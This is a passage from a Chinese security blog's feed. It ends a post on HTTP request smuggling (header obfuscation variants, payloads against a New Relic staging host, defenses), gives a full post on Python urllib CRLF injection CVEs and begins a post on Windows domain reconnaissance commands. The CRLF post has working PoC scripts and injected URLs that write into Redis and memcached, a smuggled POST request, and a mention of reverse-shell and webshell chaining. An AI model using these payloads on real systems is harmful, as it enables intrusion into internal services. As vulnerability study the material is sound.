X[\n]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding</span><br><span class="line">: chunked</span><br></pre></td></tr></table></figure><p>除此之外，更多的一些混淆方法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding:chunked</span><br><span class="line">Transfer-Encoding :chunked</span><br><span class="line">Transfer_Encoding:chunked</span><br><span class="line">Transfer Encoding:chunked</span><br><span class="line"> Transfer-Encoding:chunked</span><br><span class="line">Transfer-Encoding:  chunked</span><br><span class="line">Transfer-Encoding:chunked</span><br><span class="line">Transfer-Encoding:\tchunked</span><br><span class="line">Transfer-Encoding:\u000Bchunked</span><br><span class="line">Content-Encoding: chunked</span><br><span class="line">Transfer-Encoding:\n chunked</span><br><span class="line">Transfer-Encoding\n : chunked</span><br><span class="line">Transfer-Encoding: \&quot;chunked\&quot;</span><br><span class="line">Transfer-Encoding: &apos;chunked&apos;</span><br><span class="line">Transfer-Encoding: \n\u000Bchunked</span><br><span class="line">Transfer-Encoding: \n\tchunked</span><br><span class="line">Transfer-Encoding: chunked, cow</span><br><span class="line">Transfer-Encoding: cow, </span><br><span class="line">Transfer-Encoding: chunked\r\nTransfer-encoding: cow</span><br><span class="line">Transfer-Encoding: chunk</span><br><span class="line">Transfer-Encoding: cHuNkeD</span><br><span class="line">TrAnSFer-EnCODinG: cHuNkeD</span><br><span class="line">Transfer-Encoding: CHUNKED</span><br><span class="line">TRANSFER-ENCODING: CHUNKED</span><br><span class="line">Transfer-Encoding: chunked\r</span><br><span class="line">Transfer-Encoding: chunked\t</span><br><span class="line">Transfer-Encoding: cow\r\nTransfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: cow\r\nTransfer-Encoding: chunked</span><br><span class="line">Transfer\r-Encoding: chunked</span><br><span class="line">barn\n\nTransfer-Encoding: chunked</span><br></pre></td></tr></table></figure><h3 id="设置X-Forwarded-Proto以解决无法HTTP发送的问题"><a href="#设置X-Forwarded-Proto以解决无法HTTP发送的问题" class="headerlink" title="设置X-Forwarded-Proto以解决无法HTTP发送的问题"></a>设置X-Forwarded-Proto以解决无法HTTP发送的问题</h3><p>原payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1Host: staging-alerts.newrelic.comHTTP/1.1 301 Moved PermanentlyLocation: https://staging-alerts.newrelic.com/</span><br></pre></td></tr></table></figure><p>修改后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1Host: staging-alerts.newrelic.comX-Forwarded-Proto: httpsHTTP/1.1 404 Not FoundAction Controller: Exception caught</span><br></pre></td></tr></table></figure><h3 id="设置X-nr-external-service授权标头"><a href="#设置X-nr-external-service授权标头" class="headerlink" title="设置X-nr-external-service授权标头"></a>设置X-nr-external-service授权标头</h3><p>原payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /revision_check HTTP/1.1Host: staging-alerts.newrelic.comX-Forwarded-Proto: httpsHTTP/1.1 200 OKNot authorized with header:</span><br></pre></td></tr></table></figure><p>修改后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...GET /revision_check HTTP/1.1Host: staging-alerts.newrelic.comX-Forwarded-Proto: httpsX-nr-external-service: 1HTTP/1.1 403 ForbiddenForbidden</span><br></pre></td></tr></table></figure><h2 id="0x07-防御方法"><a href="#0x07-防御方法" class="headerlink" title="0x07 防御方法"></a>0x07 防御方法</h2><ul><li>使用HTTP2.0协议，其本身会对请求进行隔离，不存在HRS问题；</li><li>禁止前端服务器与后端服务器之间的TCP连接重用，保证不同用户不会复用同一个TCP连接；</li><li>前后端使用相同的服务器；</li><li>后端服务器需要对所有的请求字段做严格的校验，尤其是需要对备注类的头字段；</li><li>后端服务器需要针对敏感页面开启CSP；</li></ul>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="HRS" scheme="https://www.mi1k7ea.com/tags/HRS/"/>
    
  </entry>
  
  <entry>
    <title>Python urllib CRLF注入漏洞小结</title>
    <link href="https://www.mi1k7ea.com/2020/03/09/Python-urllib-CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/"/>
    <id>https://www.mi1k7ea.com/2020/03/09/Python-urllib-CRLF注入漏洞小结/</id>
    <published>2020-03-09T15:05:41.000Z</published>
    <updated>2020-03-10T16:40:10.344Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Python urllib CRLF注入漏洞是很早的东西了，但是19年又新爆出两个CVE，这里就比较下这几个CVE利用注意点及区别吧。</p><h2 id="0x01-CRLF注入漏洞"><a href="#0x01-CRLF注入漏洞" class="headerlink" title="0x01 CRLF注入漏洞"></a>0x01 CRLF注入漏洞</h2><p>CRLF是“回车 + 换行”（\r\n）的简称，十六进制，码为0x0d和0x0a。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。因此，当我们能够控制HTTP消息头中的字符，注入一些恶意的换行比如一些会话Cookie或者HTML代码，这就是CRLF注入。</p><p>具体的可看到wooyun之前的文章：<a href="https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html</a></p><h2 id="0x02-CVE-2016-5699"><a href="#0x02-CVE-2016-5699" class="headerlink" title="0x02 CVE-2016-5699"></a>0x02 CVE-2016-5699</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>urllib2 and urllib in CPython (aka Python) before 2.7.10 and 3.x before 3.4.4</p><h3 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h3><p>正常访问URL：</p><p><code>http://10.10.10.10:8080</code></p><p>CRLF注入，注入点在IP地址和端口号的分隔符即<code>:</code>前面：</p><p><code>http://10.10.10.10\r\nx-injected: header\r\ntest:8080</code></p><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><p>这部分直接引自参考的文章。</p><p>HTTP协议解析host的时候可以接受百分号编码的值，解码，然后包含在HTTP数据流里面，但是没有进一步的验证或者编码，这就可以注入一个换行符。</p><p>漏洞验证代码如下，fetch3.py：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib.error</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">url = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    info = urllib.request.urlopen(url).info()</span><br><span class="line">    print(info)</span><br><span class="line"><span class="keyword">except</span> urllib.error.URLError <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure><p>本地开启nc监听端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 12345</span><br></pre></td></tr></table></figure><p>接着，正常运行访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fetch3.py http://127.0.0.1:12345/foo</span><br></pre></td></tr></table></figure><p>在nc中会接收到如下报文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /foo HTTP/1.1</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">User-Agent: Python-urllib/3.4</span><br><span class="line">Connection: close</span><br><span class="line">Host: 127.0.0.1:12345</span><br></pre></td></tr></table></figure><p>现在，我们在IP地址和端口之间的分隔符即<code>:</code>之前进行CRLF注入，尝试注入两个HTTP头字段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fetch3.py http://127.0.0.1%0d%0aX-injected:%20header%0d%0ax-leftover:%20:12345/foo</span><br></pre></td></tr></table></figure><p>然后在nc中接收到如下报文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /foo HTTP/1.1</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">User-Agent: Python-urllib/3.4</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">X-injected: header</span><br><span class="line">x-leftover: :12345</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>可以看到，请求是正常发送的，并且在Host头字段处获取主机IP地址时成功进行了CRLF注入，即将X-injected和x-leftover这两个头字段都注入了进去。至此，攻击者就可以注入任意的HTTP头字段了。</p><p>另外，在针对的是域名而非IP地址的场景进行利用的时候有个注意点，就是在域名后进行CRLF注入之前要插入一个空字符如<code>%00</code>，这样才能顺利地进行DNS查询。</p><p>比如下面的CRLF注入会URL解析失败：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost%0d%0ax-bar:%20:12345/foo</span><br></pre></td></tr></table></figure><p>但是下面的URL是可以正常解析并访问到127.0.0.1的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost%00%0d%0ax-bar:%20:12345/foo</span><br></pre></td></tr></table></figure><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>参考这篇文章即可：<a href="https://www.cdxy.me/?p=660" target="_blank" rel="noopener">[CVE-2016-5699] Python HTTP header injection in urllib/urllib2</a></p><h2 id="0x03-CVE-2019-9740"><a href="#0x03-CVE-2019-9740" class="headerlink" title="0x03 CVE-2019-9740"></a>0x03 CVE-2019-9740</h2><h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><p>urllib2 in Python 2.x through 2.7.16 and urllib in Python 3.x through 3.7.3</p><h3 id="特征-1"><a href="#特征-1" class="headerlink" title="特征"></a>特征</h3><p>正常访问URL：</p><p><code>http://10.10.10.10:8080/test/?test=a</code></p><p>CRLF注入，注入点在IP地址和端口号的分隔符即<code>:</code>前面，但是和前者的区别在于注入新的端口：</p><p><code>http://10.10.10.10:1234?a=1 HTTP/1.1\r\nX-injected: header\r\nTEST: 123:8080/test/?test=a</code></p><h3 id="PoC-1"><a href="#PoC-1" class="headerlink" title="PoC"></a>PoC</h3><p>官网的PoC：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib.error</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">host = <span class="string">"192.168.10.137:7777?a=1 HTTP/1.1\r\nX-injected: header\r\nTEST: 123"</span></span><br><span class="line">url = <span class="string">"http://"</span> + host + <span class="string">":8080/test/?test=a"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    info = urllib.request.urlopen(url).info()</span><br><span class="line">    print(info)</span><br><span class="line"><span class="keyword">except</span> urllib.error.URLError <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure><p>在Kali开启nc监听7777端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7777</span><br></pre></td></tr></table></figure><p>然后运行PoC脚本后，在Kali端接收到请求，可以看到请求报文中是成功CRLF注入了HTTP头字段的：</p><p><img src="/2020/03/09/Python-urllib-CRLF注入漏洞小结/1.png" alt=""></p><p>接着，我们试下攻击Redis，修改PoC脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib.error</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">host = <span class="string">"192.168.10.137:6379?\r\nSET hacker mi1k7ea\r\n"</span></span><br><span class="line">url = <span class="string">"http://"</span> + host + <span class="string">":8080/test/?test=a"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    info = urllib.request.urlopen(url).info()</span><br><span class="line">    print(info)</span><br><span class="line"><span class="keyword">except</span> urllib.error.URLError <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure><p>运行脚本，显示报错：</p><p><img src="/2020/03/09/Python-urllib-CRLF注入漏洞小结/2.png" alt=""></p><p>虽然报错，但是在Kali中的Redis中成功创建了新的键值数据，也就是说成功通过Python urllib CRLF注入实现攻击Redis：</p><p><img src="/2020/03/09/Python-urllib-CRLF注入漏洞小结/3.png" alt=""></p><h3 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h3><p>参考这篇文章即可：<a href="https://xz.aliyun.com/t/5123" target="_blank" rel="noopener">CVE-2019-9740 Python urllib CRLF injection vulnerability 浅析</a></p><h2 id="0x04-CVE-2019-9947"><a href="#0x04-CVE-2019-9947" class="headerlink" title="0x04 CVE-2019-9947"></a>0x04 CVE-2019-9947</h2><h3 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h3><p>urllib2 in Python 2.x through 2.7.16 and urllib in Python 3.x through 3.7.3</p><h3 id="特征-2"><a href="#特征-2" class="headerlink" title="特征"></a>特征</h3><p>正常访问URL：</p><p><code>http://10.10.10.10:8080</code></p><p>CRLF注入，注入点在端口号后面：</p><p><code>http://10.10.10.10:8080/?q=HTTP/1.1\r\nHeader: Value\r\nHeader2: \r\n</code></p><p><code>http://10.10.10.10:8080/HTTP/1.1\r\nHeader: Value\r\nHeader2: \r\n</code></p><h3 id="PoC-2"><a href="#PoC-2" class="headerlink" title="PoC"></a>PoC</h3><p>官网的PoC：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">urllib.request.urlopen(<span class="string">'http://192.168.10.137:7777/?q=HTTP/1.1\r\nHeader: Value\r\nHeader2: \r\n'</span>)</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line"><span class="comment">#urllib.request.urlopen('http://192.168.10.137:7777/HTTP/1.1\r\nHeader: Value\r\nHeader2: \r\n')</span></span><br></pre></td></tr></table></figure><p>在Kali开启nc监听7777端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7777</span><br></pre></td></tr></table></figure><p>然后运行PoC脚本后，在Kali端接收到请求，可以看到两种形式的请求报文中都是成功CRLF注入了HTTP头字段的：</p><p><img src="/2020/03/09/Python-urllib-CRLF注入漏洞小结/4.png" alt=""></p><p><img src="/2020/03/09/Python-urllib-CRLF注入漏洞小结/5.png" alt=""></p><p>接着修改下PoC脚本来打内网Redis：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">urllib.request.urlopen(<span class="string">'http://192.168.10.137:6379/?q=HTTP/1.1\r\nSET VULN POC\r\nHeader2:\r\n'</span>)</span><br></pre></td></tr></table></figure><p>运行之后虽然报错，但在Kali的Redis中成功创建了新的键值数据，也就是说成功通过Python urllib CRLF注入实现攻击Redis：</p><p><img src="/2020/03/09/Python-urllib-CRLF注入漏洞小结/6.png" alt=""></p><h2 id="0x05-漏洞组合拳"><a href="#0x05-漏洞组合拳" class="headerlink" title="0x05 漏洞组合拳"></a>0x05 漏洞组合拳</h2><h3 id="Http-Request-Smuggling"><a href="#Http-Request-Smuggling" class="headerlink" title="Http Request Smuggling"></a>Http Request Smuggling</h3><p>HRS即HTTP请求走私，在2005年的时候已被提出，只是最近圈内比较重视敏感信息泄露这块才被重新关注，可参考：</p><p>比如原始请求如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /foo HTTP/1.1</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">User-Agent: Python-urllib/3.4</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>根据HRS，攻击者可以追加注入一个完整的HTTP请求头：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1%0d%0aConnection%3a%20Keep-Alive%0d%0a%0d%0aPOST%20%2fbar%20HTTP%2f1.1%0d%0aHost%3a%20127.0.0.1%0d%0aContent-Length%3a%2031%0d%0a%0d%0a%7b%22new%22%3a%22json%22%2c%22content%22%3a%22here%22%7d%0d%0a:12345/foo</span><br></pre></td></tr></table></figure><p>此时请求包内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET /foo HTTP/1.1</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">User-Agent: Python-urllib/3.4</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line"></span><br><span class="line">POST /bar HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 31</span><br><span class="line"></span><br><span class="line">&#123;&quot;new&quot;:&quot;json&quot;,&quot;content&quot;:&quot;here&quot;&#125;</span><br><span class="line">:12345</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>该请求在Apache HTTPD下是能成功利用的，但在其他的Web容器中就不一定能正确地解析利用了，这是需要前端服务和后端服务解析的二义性才能导致HRS攻击成功。</p><p>这种攻击可以用在内网攻击上，比如无认证的Rest接口等。</p><h3 id="Redis未授权访问漏洞"><a href="#Redis未授权访问漏洞" class="headerlink" title="Redis未授权访问漏洞"></a>Redis未授权访问漏洞</h3><p>如果Redis在本地未设置密码验证即存在未授权访问漏洞，那么攻击者可以组合Python urllib CRLF注入漏洞来攻击利用Redis未授权访问漏洞，通过其备份文件的功能实现写WebShell、SSH公钥和定时任务反弹shell等等。</p><p>参考：<a href="https://security.tencent.com/index.php/blog/msg/106" target="_blank" rel="noopener">Hack Redis via Python urllib HTTP Header Injection</a></p><h3 id="Memcached未授权访问漏洞"><a href="#Memcached未授权访问漏洞" class="headerlink" title="Memcached未授权访问漏洞"></a>Memcached未授权访问漏洞</h3><p>Memcached是一套常用的key-value缓存系统，由于它本身没有权限控制模块，即使没有对外开放端口，但攻击者还是可以组合Python urllib CRLF注入漏洞来通过命令交互来直接读入Memcached中的敏感信息。</p><p>如果我们可以控制内网的Python访问一个URL，然后我们就可以轻松的访问memcached了，比如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1%0d%0aset%20foo%200%200%205%0d%0aABCDE%0d%0a:11211/foo</span><br></pre></td></tr></table></figure><p>就会产生下面的HTTP头</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /foo HTTP/1.1</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">Connection: close</span><br><span class="line">User-Agent: Python-urllib/3.4</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">set foo 0 0 5</span><br><span class="line">ABCDE</span><br><span class="line">:11211</span><br></pre></td></tr></table></figure><p>当检查下面几行memcached的协议语法的时候，大部分都是语法错误，但是memcached在收到错误的命令的时候并不会关闭连接，这样攻击者就可以在请求的任何位置注入命令了，然后memcached就会执行。下面是memcached的响应（memcached是Debian下包管理默认配置安装的）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ERROR</span><br><span class="line">ERROR</span><br><span class="line">ERROR</span><br><span class="line">ERROR</span><br><span class="line">ERROR</span><br><span class="line">STORED</span><br><span class="line">ERROR</span><br><span class="line">ERROR</span><br></pre></td></tr></table></figure><p>经过确认，memcached中确实成功的插入了<code>foo</code>的值。这种场景下，攻击者就可以给内网的memcached实例发送任意命令了。如果应用依赖于memcached中存储的数据（比如用户的session数据，HTML或者其他的敏感数据），攻击者可能获取应用更高的权限了。这个利用方式还可以造成拒绝服务攻击，就是攻击者可以在memcached中存储大量的数据。</p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="https://xz.aliyun.com/t/5123" target="_blank" rel="noopener">CVE-2019-9740 Python urllib CRLF injection vulnerability 浅析</a></p><p><a href="http://pages.strcpy.me/index.php/archives/749/" target="_blank" rel="noopener">Python urllib HTTP头注入漏洞</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Python" scheme="https://www.mi1k7ea.com/categories/Python/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Python" scheme="https://www.mi1k7ea.com/tags/Python/"/>
    
      <category term="CRLF注入" scheme="https://www.mi1k7ea.com/tags/CRLF%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>内网信息收集之域相关信息收集</title>
    <link href="https://www.mi1k7ea.com/2020/03/08/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E5%9F%9F%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>https://www.mi1k7ea.com/2020/03/08/内网信息收集之域相关信息收集/</id>
    <published>2020-03-08T09:23:51.000Z</published>
    <updated>2020-03-08T14:14:43.448Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-参考"><a href="#0x00-参考" class="headerlink" title="0x00 参考"></a>0x00 参考</h2><p>《内网安全攻防》笔记。</p><h2 id="0x01-判断是否存在域"><a href="#0x01-判断是否存在域" class="headerlink" title="0x01 判断是否存在域"></a>0x01 判断是否存在域</h2><p>获得本机相关信息之后，就要判断当前内网中是否存在域。如果当前内网存在域，则需要判断所控主机是否在域内。</p><h3 id="ipconfig命令"><a href="#ipconfig命令" class="headerlink" title="ipconfig命令"></a>ipconfig命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure><p>使用该命令即可查看网管IP、DNS IP、域名、本机是否和DNS服务器出于同一网段等信息。</p><p><img src="/2020/03/08/内网信息收集之域相关信息收集/1.png" alt=""></p><p>然后就可以通过反向解析命令nslookup来解析域名的IP地址，用解析得到的IP地址进行对比，判断DC和DNS服务是否在同一台服务器上。</p><p><img src="/2020/03/08/内网信息收集之域相关信息收集/2.png" alt=""></p><h3 id="查看系统详细信息"><a href="#查看系统详细信息" class="headerlink" title="查看系统详细信息"></a>查看系统详细信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><p>显示项的“域”即域名，“登录服务器”即域控制器。若“域”为“WORKGROUP”则表示当前机器不在域内。</p><p><img src="/2020/03/08/内网信息收集之域相关信息收集/3.png" alt=""></p><h3 id="查询当前登录域及登录用户信息"><a href="#查询当前登录域及登录用户信息" class="headerlink" title="查询当前登录域及登录用户信息"></a>查询当前登录域及登录用户信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure><p>显示项的“工作站域 DNS 名称”即域名（若为“WORKGROUP”则表示不在域中），“登录域”用于表示当前登录的用户是域用户还是本地用户。</p><p><img src="/2020/03/08/内网信息收集之域相关信息收集/4.png" alt=""></p><h3 id="判断主域"><a href="#判断主域" class="headerlink" title="判断主域"></a>判断主域</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure><p>该命令用于判断主域（域服务器通常会同时作为时间服务器使用），执行后通常会有如下三种情况：</p><p>1、存在域，但当前用户不是域用户。</p><p><img src="/2020/03/08/内网信息收集之域相关信息收集/6.png" alt=""></p><p>2、存在域，且当前用户是域用户。</p><p><img src="/2020/03/08/内网信息收集之域相关信息收集/5.png" alt=""></p><p>3、当前网络环境为工作组，不存在域。</p><p><img src="/2020/03/08/内网信息收集之域相关信息收集/7.png" alt=""></p><h2 id="0x02-探测域内存活主机"><a href="#0x02-探测域内存活主机" class="headerlink" title="0x02 探测域内存活主机"></a>0x02 探测域内存活主机</h2><h3 id="利用NetBIOS探测内网"><a href="#利用NetBIOS探测内网" class="headerlink" title="利用NetBIOS探测内网"></a>利用NetBIOS探测内网</h3>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="内网渗透" scheme="https://www.mi1k7ea.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透测试" scheme="https://www.mi1k7ea.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="内网渗透" scheme="https://www.mi1k7ea.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Redis安全小结</title>
    <link href="https://www.mi1k7ea.com/2020/03/05/Redis%E5%AE%89%E5%85%A8%E5%B0%8F%E7%BB%93/"/>
    <id>https://www.mi1k7ea.com/2020/03/05/Redis安全小结/</id>
    <published>2020-03-05T14:29:30.000Z</published>
    <updated>2020-03-10T14:48:19.302Z</updated>
    
